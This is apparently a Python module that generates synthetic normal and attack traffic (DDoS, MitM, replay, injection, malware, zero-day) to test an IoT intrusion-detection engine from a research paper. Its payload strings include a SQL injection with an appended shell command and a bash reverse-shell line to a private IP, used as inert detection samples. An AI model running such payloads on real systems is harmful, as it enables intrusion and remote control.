"""
Synthetic Attack Traffic Generator.

Generates the six attack categories evaluated in the paper:
  DDoS, MitM, Replay, Injection, Malware, Zero-day

Each generator returns a DeviceObservation with stat_features,
feature_vector, and payload that are statistically distinct from
normal traffic — allowing the monitoring engine to detect them.

Paper reference — Section V-C (Dataset).
"""

from __future__ import annotations
import os
import random
import time
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional, Tuple

import numpy as np

from dmas.monitoring.monitoring_engine import DeviceObservation


class AttackType(Enum):
    NORMAL = "normal"
    DDOS = "ddos"
    MITM = "mitm"
    REPLAY = "replay"
    INJECTION = "injection"
    MALWARE = "malware"
    ZERO_DAY = "zero_day"


@dataclass
class AttackEvent:
    attack_type: AttackType
    device_id: str
    observation: DeviceObservation
    ground_truth: bool = True       # is this actually malicious?


class TrafficProfile:
    """
    Parametric normal-traffic baseline for one device class.

    Each device class has characteristic mean packet rates,
    payload sizes, and inter-arrival patterns drawn from a
    multivariate Gaussian.
    """

    _PROFILES = {
        "plc": {
            "packet_rate_mean": 12.0, "packet_rate_std": 2.0,
            "payload_size_mean": 64.0, "payload_size_std": 8.0,
            "conn_count_mean": 3.0, "conn_count_std": 0.5,
            "protocol_entropy_mean": 0.8, "protocol_entropy_std": 0.05,
        },
        "scada": {
            "packet_rate_mean": 25.0, "packet_rate_std": 5.0,
            "payload_size_mean": 128.0, "payload_size_std": 20.0,
            "conn_count_mean": 8.0, "conn_count_std": 1.5,
            "protocol_entropy_mean": 1.2, "protocol_entropy_std": 0.1,
        },
        "camera": {
            "packet_rate_mean": 200.0, "packet_rate_std": 30.0,
            "payload_size_mean": 1400.0, "payload_size_std": 100.0,
            "conn_count_mean": 2.0, "conn_count_std": 0.3,
            "protocol_entropy_mean": 0.5, "protocol_entropy_std": 0.05,
        },
        "sensor": {
            "packet_rate_mean": 5.0, "packet_rate_std": 1.0,
            "payload_size_mean": 32.0, "payload_size_std": 4.0,
            "conn_count_mean": 1.0, "conn_count_std": 0.2,
            "protocol_entropy_mean": 0.3, "protocol_entropy_std": 0.02,
        },
    }

    def __init__(self, device_class: str = "sensor", seed: int = 42):
        self.device_class = device_class
        self.p = self._PROFILES.get(device_class, self._PROFILES["sensor"])
        self.rng = np.random.default_rng(seed)

    def sample_normal(self) -> Dict[str, float]:
        """Draw one normal traffic observation."""
        return {
            "packet_rate": max(0, self.rng.normal(
                self.p["packet_rate_mean"], self.p["packet_rate_std"])),
            "payload_size": max(0, self.rng.normal(
                self.p["payload_size_mean"], self.p["payload_size_std"])),
            "conn_count": max(0, self.rng.normal(
                self.p["conn_count_mean"], self.p["conn_count_std"])),
            "protocol_entropy": max(0, self.rng.normal(
                self.p["protocol_entropy_mean"], self.p["protocol_entropy_std"])),
        }

    def sample_feature_vector(self, stat_features: Dict[str, float]) -> np.ndarray:
        """Convert stat features to a fixed-length 8-element feature vector."""
        vals = list(stat_features.values())[:4]
        noise = self.rng.normal(0, 0.01, 4).tolist()
        return np.array((vals + noise)[:8], dtype=np.float32)


class AttackGenerator:
    """
    Generates attack-traffic DeviceObservations for simulation.

    Parameters
    ----------
    seed : int
    attack_rate_per_min : float
        Expected attacks per minute across all devices.
    """

    def __init__(self, seed: int = 42, attack_rate_per_min: float = 5.0) -> None:
        self.rng = random.Random(seed)
        self.np_rng = np.random.default_rng(seed)
        self.attack_rate_per_min = attack_rate_per_min
        self._profiles: Dict[str, TrafficProfile] = {}
        self._seq_buffers: Dict[str, List[np.ndarray]] = {}

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate(
        self,
        device_id: str,
        device_class: str = "sensor",
        attack_type: Optional[AttackType] = None,
    ) -> AttackEvent:
        """
        Generate one observation for a device.

        If attack_type is None, randomly decides based on attack_rate.
        """
        profile = self._get_profile(device_id, device_class)

        if attack_type is None:
            attack_type = self._random_attack_type()

        if attack_type == AttackType.NORMAL:
            return self._normal_event(device_id, profile)
        elif attack_type == AttackType.DDOS:
            return self._ddos_event(device_id, profile)
        elif attack_type == AttackType.MITM:
            return self._mitm_event(device_id, profile)
        elif attack_type == AttackType.REPLAY:
            return self._replay_event(device_id, profile)
        elif attack_type == AttackType.INJECTION:
            return self._injection_event(device_id, profile)
        elif attack_type == AttackType.MALWARE:
            return self._malware_event(device_id, profile)
        elif attack_type == AttackType.ZERO_DAY:
            return self._zero_day_event(device_id, profile)
        else:
            return self._normal_event(device_id, profile)

    def generate_batch(
        self,
        device_ids: List[str],
        device_classes: Optional[List[str]] = None,
        n_events: int = 100,
        attack_fraction: float = 0.15,
    ) -> List[AttackEvent]:
        """
        Generate a batch of events across multiple devices with a
        specified fraction of attack events.
        """
        if device_classes is None:
            device_classes = ["sensor"] * len(device_ids)

        events = []
        for _ in range(n_events):
            idx = self.rng.randint(0, len(device_ids) - 1)
            device_id = device_ids[idx]
            device_class = device_classes[idx]

            if self.rng.random() < attack_fraction:
                attack_type = self.rng.choice([
                    AttackType.DDOS, AttackType.MITM, AttackType.REPLAY,
                    AttackType.INJECTION, AttackType.MALWARE, AttackType.ZERO_DAY
                ])
            else:
                attack_type = AttackType.NORMAL

            events.append(self.generate(device_id, device_class, attack_type))
        return events

    # ------------------------------------------------------------------
    # Normal traffic
    # ------------------------------------------------------------------

    def _normal_event(self, device_id: str, profile: TrafficProfile) -> AttackEvent:
        stat = profile.sample_normal()
        fv = profile.sample_feature_vector(stat)
        obs = DeviceObservation(
            device_id=device_id,
            timestamp=time.time(),
            stat_features=stat,
            feature_vector=fv,
            payload=b"\x00" * int(stat["payload_size"]),
        )
        return AttackEvent(AttackType.NORMAL, device_id, obs, ground_truth=False)

    # ------------------------------------------------------------------
    # DDoS — massively elevated packet rate
    # ------------------------------------------------------------------

    def _ddos_event(self, device_id: str, profile: TrafficProfile) -> AttackEvent:
        stat = profile.sample_normal()
        stat["packet_rate"] *= self.np_rng.uniform(15, 40)   # 15–40× spike
        stat["conn_count"] *= self.np_rng.uniform(5, 20)
        fv = profile.sample_feature_vector(stat)
        payload = (b"\x02\x04\x05\xb4\x01\x01\x08\x0a" * 8 +
                   b"\x00" * max(0, int(stat["payload_size"]) - 64))
        obs = DeviceObservation(
            device_id=device_id, timestamp=time.time(),
            stat_features=stat, feature_vector=fv, payload=payload,
        )
        return AttackEvent(AttackType.DDOS, device_id, obs, ground_truth=True)

    # ------------------------------------------------------------------
    # MitM — modified payload, moderate packet anomaly
    # ------------------------------------------------------------------

    def _mitm_event(self, device_id: str, profile: TrafficProfile) -> AttackEvent:
        stat = profile.sample_normal()
        stat["protocol_entropy"] *= 1.8
        stat["payload_size"] *= self.np_rng.uniform(0.4, 0.6)  # truncated
        fv = profile.sample_feature_vector(stat)
        payload = b"\x00\x02\x00\x00\x00\x00\x00\x00" + b"HTTP/1.1 301\r\nLocation: http://"
        obs = DeviceObservation(
            device_id=device_id, timestamp=time.time(),
            stat_features=stat, feature_vector=fv, payload=payload,
        )
        return AttackEvent(AttackType.MITM, device_id, obs, ground_truth=True)

    # ------------------------------------------------------------------
    # Replay — very regular timing (low entropy in inter-arrival)
    # ------------------------------------------------------------------

    def _replay_event(self, device_id: str, profile: TrafficProfile) -> AttackEvent:
        stat = profile.sample_normal()
        stat["protocol_entropy"] = max(0, stat["protocol_entropy"] * 0.1)
        fv = profile.sample_feature_vector(stat)
        # Modbus function code replay marker
        payload = b"\x00\x01\x00\x00\x00\x06\xff\x03" * 4
        obs = DeviceObservation(
            device_id=device_id, timestamp=time.time(),
            stat_features=stat, feature_vector=fv, payload=payload,
        )
        return AttackEvent(AttackType.REPLAY, device_id, obs, ground_truth=True)

    # ------------------------------------------------------------------
    # Injection — small packet, high-severity payload
    # ------------------------------------------------------------------

    def _injection_event(self, device_id: str, profile: TrafficProfile) -> AttackEvent:
        stat = profile.sample_normal()
        stat["payload_size"] = self.np_rng.uniform(20, 80)
        fv = profile.sample_feature_vector(stat)
        payload = b"' OR '1'='1; /bin/sh -c whoami"
        obs = DeviceObservation(
            device_id=device_id, timestamp=time.time(),
            stat_features=stat, feature_vector=fv, payload=payload,
        )
        return AttackEvent(AttackType.INJECTION, device_id, obs, ground_truth=True)

    # ------------------------------------------------------------------
    # Malware — elevated rates + known malware signature bytes
    # ------------------------------------------------------------------

    def _malware_event(self, device_id: str, profile: TrafficProfile) -> AttackEvent:
        stat = profile.sample_normal()
        stat["packet_rate"] *= self.np_rng.uniform(3, 8)
        stat["conn_count"] *= self.np_rng.uniform(2, 5)
        fv = profile.sample_feature_vector(stat)
        payload = b"\xff\x53\x4d\x42\x72\x00\x00\x00" + b"bash -i >& /dev/tcp/192.168.1.99/4444"
        obs = DeviceObservation(
            device_id=device_id, timestamp=time.time(),
            stat_features=stat, feature_vector=fv, payload=payload,
        )
        return AttackEvent(AttackType.MALWARE, device_id, obs, ground_truth=True)

    # ------------------------------------------------------------------
    # Zero-day — statistically anomalous but no signature match
    # ------------------------------------------------------------------

    def _zero_day_event(self, device_id: str, profile: TrafficProfile) -> AttackEvent:
        stat = profile.sample_normal()
        # Unusual combination: low rate, very large payload, high entropy
        stat["packet_rate"] = self.np_rng.uniform(0.1, 1.0)
        stat["payload_size"] = self.np_rng.uniform(8000, 16000)
        stat["protocol_entropy"] = self.np_rng.uniform(3.5, 4.0)
        fv = profile.sample_feature_vector(stat)
        # Novel payload with no known signature
        payload = bytes(self.np_rng.integers(0, 256, 64, dtype=np.uint8).tolist())
        obs = DeviceObservation(
            device_id=device_id, timestamp=time.time(),
            stat_features=stat, feature_vector=fv, payload=payload,
        )
        return AttackEvent(AttackType.ZERO_DAY, device_id, obs, ground_truth=True)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _random_attack_type(self) -> AttackType:
        ticks_per_min = 60
        attack_prob = self.attack_rate_per_min / ticks_per_min
        if self.rng.random() > attack_prob:
            return AttackType.NORMAL
        return self.rng.choice([
            AttackType.DDOS, AttackType.MITM, AttackType.REPLAY,
            AttackType.INJECTION, AttackType.MALWARE, AttackType.ZERO_DAY,
        ])

    def _get_profile(self, device_id: str, device_class: str) -> TrafficProfile:
        if device_id not in self._profiles:
            seed = abs(hash(device_id)) % (2 ** 31)
            self._profiles[device_id] = TrafficProfile(device_class, seed=seed)
        return self._profiles[device_id]
